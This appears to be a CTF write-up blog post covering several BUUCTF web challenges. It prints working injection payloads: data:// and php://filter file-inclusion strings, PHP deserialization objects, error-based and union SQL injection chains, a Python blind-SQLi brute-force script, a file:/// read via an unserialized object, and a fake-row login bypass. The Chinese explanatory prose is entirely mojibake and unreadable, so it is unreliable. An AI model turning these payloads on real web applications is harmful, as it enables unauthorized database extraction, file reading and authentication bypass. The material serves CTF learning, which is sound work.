<p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210418161711896.png" alt="image-20210418161711896" srcset="/posts/buu-web-0x10-0x1f/image-20210418161711896.png?size=small, /posts/buu-web-0x10-0x1f/image-20210418161711896.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210418161711896.png?size=large 2x" data-title="image-20210418161711896" style="--width: 818px;--aspect-ratio: 818 / 156;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ<code>$_SERVER['DOCUMENT_ROOT']</code> æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>
<p>åœ¨ <code>.user.ini</code> é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>
<blockquote>
<p><code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p>
</blockquote>
<p>è¦ç”¨åˆ°çš„é…ç½®ï¼š<strong><code>auto_append_file</code></strong>ï¼š<strong>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°</strong></p>
<p>æ¯”å¦‚ï¼š<code>auto_prepend_file=1.gif</code></p>
<p>ä¹‹å</p>
<pre tabindex="0"><code>GIF89a? 
auto_prepend_file=1.gif`</code></pre><p>å…³äº.user.iniçš„æ–‡ç« ï¼š</p>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html"target="_blank" rel="external nofollow noopener noreferrer">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<h3 id="0x16zjctf-2019nizhuansiwei" class="heading-element"><span>0x16.[ZJCTF 2019]NiZhuanSiWei</span>
  <a href="#0x16zjctf-2019nizhuansiwei" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
</span></span><span class="line"><span class="cl"><span class="nv">$text</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;text&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;welcome to the zjctf&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span class="o">.</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$text</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/&#34;</span><span class="p">,</span><span class="nv">$file</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Not now!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>  <span class="c1">//useless.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$password</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>çŸ¥è¯†ç‚¹ï¼š</p>
<pre tabindex="0"><code>dataä¼ªåè®®å†™å…¥æ–‡ä»¶
php://filterç”¨äºè¯»å–æºç 
php://inputç”¨äºæ‰§è¡ŒPHPçš„ä»£ç </code></pre><p>é¦–å…ˆï¼š</p>
<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,'r')===&quot;welcome to the zjctf&quot;)</code></p>
<p>dataåè®®é€šå¸¸æ˜¯ç”¨æ¥æ‰§è¡ŒPHPä»£ç ï¼Œç„¶è€Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥dataåè®®ä¸­ç„¶åè®©file_get_contentså‡½æ•°å–è¯»å–ã€‚æ„é€ å¦‚ä¸‹ï¼š</p>
<pre tabindex="0"><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre><p>å½“ç„¶ä¹Ÿå¯ä»¥ä¸éœ€è¦base64ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤éƒ½ä¼šç”¨åˆ°base64ã€‚</p>
<pre tabindex="0"><code>data://text/plain,welcome to the zjctf</code></pre><p>æ¥ä¸‹æ¥æ˜¯file:</p>
<pre tabindex="0"><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>å¾—åˆ°ï¼š</p>
<pre tabindex="0"><code>&lt;?php  
class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this-&gt;file)){  
            echo file_get_contents($this-&gt;file); 
            echo &#34;&lt;br&gt;&#34;;
        return (&#34;U R SO CLOSE !///COME ON PLZ&#34;);
        }  
    }  
}  
?&gt;  </code></pre><p>å‚è€ƒååºåˆ—åŒ–åŸºç¡€çš„æ–‡ç« ï¼šhttps://www.freebuf.com/articles/web/167721.html</p>
<p>æ„é€ ï¼š</p>
<pre tabindex="0"><code>O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;}</code></pre><p>æœ€ç»ˆpayloadï¼š</p>
<pre tabindex="0"><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&#34;Flag&#34;:1:{s:4:&#34;file&#34;;s:8:&#34;flag.php&#34;;}</code></pre><h3 id="0x17æå®¢å¤§æŒ‘æˆ˜-2019hardsql" class="heading-element"><span>0x17.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span>
  <a href="#0x17%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019hardsql" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>&#39;or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23
å¾—åˆ°æ•°æ®åº“geek

&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))%23
å¾—åˆ°è¡¨åï¼šH4rDsq1

or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))%23
å¾—åˆ°å­—æ®µï¼šid,username,password

æŸ¥æ•°æ®ï¼š
or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))%23
åªæŸ¥åˆ°äº†ä¸€åŠï¼šXPATH syntax error: &#39;~1flagflag{b615ddd5-228b-4383-9a&#39;
å¯ä»¥ä½¿ç”¨right()è¯­å¥ï¼š
or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e),1))%23</code></pre><h3 id="0x18ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world" class="heading-element"><span>0x18.[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span>
  <a href="#0x18ciscn2019-%e5%8d%8e%e5%8c%97%e8%b5%9b%e5%8c%ba-day2-web1hack-world" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>æ‰¾ä¸ªå­—å…¸è·‘äº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†ä¸€äº›ï¼Œæœ‰äº›æ²¡è¿‡æ»¤ã€‚</p>
<p>å¸ƒå°”ç›²æ³¨ï¼š</p>
<p>ç”¨çš„ç½‘ä¸Šçš„è„šæœ¬ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://07113360-9eb3-4e8d-8085-4284220b1372.node3.buuoj.cn/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">22</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;1^if((ascii(substr((select(flag)from(flag)),</span><span class="si">%d</span><span class="s2">,1))=</span><span class="si">%d</span><span class="s2">),0,1)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#æˆ–è€…ï¼š0^(ascii(substr((select(flag)from(flag)),%d,1))=%d)</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;Hello, glzjin wants a girlfriend.&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1">#res += (chr(j))</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;end ....&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></span></span></code></pre></div><p>å…¶ä¸­ï¼Œå¼‚æˆ–çš„^å¯ä»¥èµ·åˆ°orçš„ä½œç”¨</p>
<p>å› ä¸ºæ¯æ¬¡è·‘çš„æ—¶å€™ä¼šæ¼æ‰ä¸€äº›ï¼Œæ‰€ä»¥å°†æ¯ä¸ªéƒ½è¾“å‡ºï¼Œç„¶åå°†ç¼ºå°‘çš„åœ¨æ‰“å°ã€‚</p>
<h3 id="0x19ç½‘é¼æ¯-2018fakebook" class="heading-element"><span>0x19.[ç½‘é¼æ¯ 2018]Fakebook</span>
  <a href="#0x19%e7%bd%91%e9%bc%8e%e6%9d%af-2018fakebook" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>robots.txtæœ‰æºç æ³„éœ²</p>
<p>å¯èƒ½ä¸ssrfæœ‰å…³</p>
<p>ç™»é™†åæœ‰SQLæ³¨å…¥ï¼Œå¯¹ç©ºæ ¼æœ‰è¿‡æ»¤ï¼Œå¯ä»¥æŠ¥é”™æ³¨å…¥æˆ–è€…/**/ä»£æ›¿ç©ºæ ¼ï¼š</p>
<pre tabindex="0"><code>?no=-1 or updatexml(1,concat(&#39;\~&#39;,database(),&#39;\~&#39;),1)#
æ•°æ®åº“åï¼šfakebook 

no=11/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables where table_schema=&#39;fakebook&#39; #
è¡¨åï¼šusers

no=11/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns where table_schema=&#39;fakebook&#39;and table_name=&#39;users&#39; #
å­—æ®µï¼šno,username,passwd,data 

ä¹‹åè¿”å›çš„æ˜¯ï¼š
O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:6:&#34;123123&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:13:&#34;www.baidu.com&#34;;} </code></pre><p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210503165820953.png" alt="image-20210503165820953" srcset="/posts/buu-web-0x10-0x1f/image-20210503165820953.png?size=small, /posts/buu-web-0x10-0x1f/image-20210503165820953.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210503165820953.png?size=large 2x" data-title="image-20210503165820953" style="--width: 1586px;--aspect-ratio: 1586 / 330;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>é‚£ä¹ˆè¿›è¡Œååºåˆ—åŒ–ï¼š</p>
<p><img loading="lazy" src="/posts/buu-web-0x10-0x1f/image-20210503170124576.png" alt="image-20210503170124576" srcset="/posts/buu-web-0x10-0x1f/image-20210503170124576.png?size=small, /posts/buu-web-0x10-0x1f/image-20210503170124576.png?size=medium 1.5x, /posts/buu-web-0x10-0x1f/image-20210503170124576.png?size=large 2x" data-title="image-20210503170124576" style="--width: 1358px;--aspect-ratio: 1358 / 416;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>å› ä¸ºblogæ˜¯åœ¨dataï¼Œæ‰€ä»¥ï¼š</p>
<pre tabindex="0"><code>no=-1/**/union/**/select/**/1,2,3,&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:0:&#34;&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</code></pre><p>æºç ä¸­æœ‰flagã€‚</p>
<h3 id="0x1agxyctf2019babysqli" class="heading-element"><span>0x1A.[GXYCTF2019]BabySQli</span>
  <a href="#0x1agxyctf2019babysqli" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>è€ƒç‚¹ï¼šè”åˆæ³¨å…¥æ·»åŠ ä¸´æ—¶è™šæ‹Ÿç”¨æˆ·</p>
<p>éšä¾¿è¾“å…¥åçœ‹æºç ï¼Œ</p>
<blockquote>
<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
</blockquote>
<p>å…ˆbase32ï¼Œä¹‹åæ˜¯64</p>
<blockquote>
<p>select * from user where username = &lsquo;$name&rsquo;</p>
</blockquote>
<p>æµ‹è¯•äº†ä¸‹æ˜¯3ä¸ªå­—æ®µï¼š</p>
<blockquote>
<p>union select 1,2,3</p>
</blockquote>
<p>å½“usernameä¸æ˜¯adminçš„æ—¶å€™æŠ¥é”™wrong userï¼Œå¦åˆ™æŠ¥wrong password</p>
<p>å°†&rsquo;admin&rsquo;æ”¾åœ¨2çš„ä½ç½®ä¸ŠæŠ¥ç‹è“‰ password</p>
<blockquote>
<p>union select 1,&lsquo;admin&rsquo;,3</p>
</blockquote>
<p>mysqlå½“è”åˆæŸ¥è¯¢æ—¶ï¼Œæ²¡æœ‰çš„è¯ä¼šåœ¨æ•°æ®åº“ä¸­åŠ å…¥ä¸´æ—¶çš„</p>
<!-- raw HTML omitted -->
<p>(å®é™…ä¸Šåº”è¯¥ä¸ç”¨çŒœï¼Œåº”è¯¥æ˜¯ä¸ªå‘ï¼ŒåŸé¢˜åº”è¯¥æœ‰æç¤ºå¯†ç æ˜¯md5åŠ å¯†å‚¨å­˜çš„)</p>
<p>çŒœæµ‹è¯­å¥æ˜¯è¿™æ ·çš„:</p>
<pre tabindex="0"><code>&lt;?php$row;
$pass=$_POST[&#39;pw&#39;];
if($row[&#39;username&#39;]==â€™adminâ€™){
if($row[&#39;password&#39;]==md5($pass)){ 
echo $flag; 
}else{ echo â€œwrong pass!â€; 
}}
else{ echo â€œwrong user!â€;}</code></pre><p>é‚£ä¹ˆå¯ä»¥è¿™æ ·æ„é€ ï¼š123çš„md5ï¼š202cb962ac59075b964b07152d234b70</p>
<p>äºæ˜¯ï¼šadf&rsquo;union select 1,&lsquo;admin&rsquo;,&lsquo;202cb962ac59075b964b07152d234b70&rsquo;</p>
<p>pwdä¸º123</p>
<h3 id="0x1bç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz" class="heading-element"><span>0x1B.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span>
  <a href="#0x1b%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>çœ‹äº†wpæ‰åšå‡ºæ¥çš„ï¼Œç¡®å®æ„Ÿè§‰è¿™é“é¢˜æŒºæœ‰æ„æ€ã€‚</p>
<p>é¦–å…ˆgetä¼ strï¼Œæ¯ä¸ªå­—ç¬¦è¦åœ¨32åˆ°125ä¹‹é—´ï¼Œä¹‹åååºåˆ—åŒ–ã€‚</p>
<p>ååºåˆ—åŒ–æ—¶ç”¨äº†__destructæ–¹æ³•ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>å¦‚æœopä¸º2ï¼Œèµ‹å€¼ä¸º1ï¼Œæº¶èš€contentèµ‹ä¸ºç©ºï¼Œå†ä¹‹åæ‰§è¡Œprocessï¼Œè¿™é‡Œopä¸2æ¯”è¾ƒæ˜¯å¼ºæ¯”è¾ƒã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Bad Hacker!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>å¦‚æœopæ˜¯1ï¼Œè¿›å…¥writeï¼Œå¦‚æœæ˜¯2çš„è¯è¿›å…¥outputï¼Œè¿™é‡Œä¸¤å¤„éƒ½æ˜¯è‹¥æ¯”è¾ƒã€‚</p>
